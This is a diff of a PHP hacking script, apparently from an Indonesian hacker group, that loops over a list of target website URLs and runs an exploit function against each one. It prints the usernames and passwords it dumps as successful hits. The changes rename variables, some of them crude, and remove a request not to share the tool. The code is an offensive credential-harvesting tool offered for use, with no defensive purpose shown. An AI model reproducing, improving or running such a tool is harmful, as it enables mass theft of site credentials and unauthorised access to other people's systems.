@@ -1,9 +1,5 @@
 <?php
 /* Welcome To Source Code */
-/* Harap Hormati pembuat tools ini */
-/* Dengan Tidak Record sesukanya */
-/* Terimakasih.. */
-
 /*
    Coded by Zeerx7
 */
@@ -59,12 +55,12 @@ foreach($file as $url){
  $urls = $url."$urls";
  //$urls= $url."/member/listmemberall.php";
  $urlo= $utl."/admin/";
- $isi = exploit($urls);
- if(!empty($isi[1])) {
+ $sheep = exploit($urls);
+ if(!empty($sheep[1])) {
      $i=1;
-     foreach($isi[1] as $get) {
-	 $pussy = $C."[+]$G Username : ".str_replace(":", $C."\n[+]$G Password : ", $get);
-	 echo $C."\n[+]$G Successful -> ".$urls;
+     foreach($sheep[1] as $bro) {
+ 	 echo $C."\n[+]$G Successful -> ".$urls;
+	 $pussy = $C."[+]$G Username : ".str_replace(":", $C."\n[+]$G Password : ", $bro);
          echo $C."\n[+]$G ".$i++."$C [+]";
          echo "\n$pussy\n";
      }
@@ -102,5 +98,6 @@ $P         usage:$C php balit.php list.txt
 $B ---------------------------------------------
 ";
 }
+echo "\n";
 /* CopyRight 2020 Indonesian Hacker Rulez */
 ?>
